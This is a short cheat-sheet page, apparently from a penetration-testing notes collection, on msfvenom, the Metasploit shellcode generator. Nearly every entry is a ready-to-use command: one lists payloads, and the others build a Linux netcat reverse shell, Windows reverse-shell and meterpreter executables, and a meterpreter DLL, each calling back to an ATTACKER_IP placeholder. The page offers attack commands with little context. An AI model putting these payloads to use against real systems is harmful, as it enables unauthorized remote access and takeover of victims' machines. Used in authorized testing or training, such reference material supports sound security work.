---
title: MSFVENOM
summary: A Metasploit module that generates shellcodes.
description: A Metasploit module that generates shellcodes.
---

[https://github.com/rapid7/metasploit-framework/blob/master/msfvenom](https://github.com/rapid7/metasploit-framework/blob/master/msfvenom)

## MSFVENOM Base

Payloads naming convention : \[OS\]/\[arch\]/\[payload\]

 > 
 > **<font color=red>msfvenom --list payloads</font>**</br>
 > List payloads.

## MSFVENOM Linux Reverse Shell


 > 
 > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
 > Generate a Linux reverse shell.

## MSFVENOM Windows Reverse Shell


 > 
 > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o</font> shell<font color=red>.exe</font>**</br>
 > Generate a reverse shell exe.

 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o </font>shell<font color=red>.exe</font>**</br>
 > Generate a meterpreter reverse shell exe.

 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> shell<font color=red>.dll</font>**</br>
 > Generate a meterpreter reverse shell DLL.
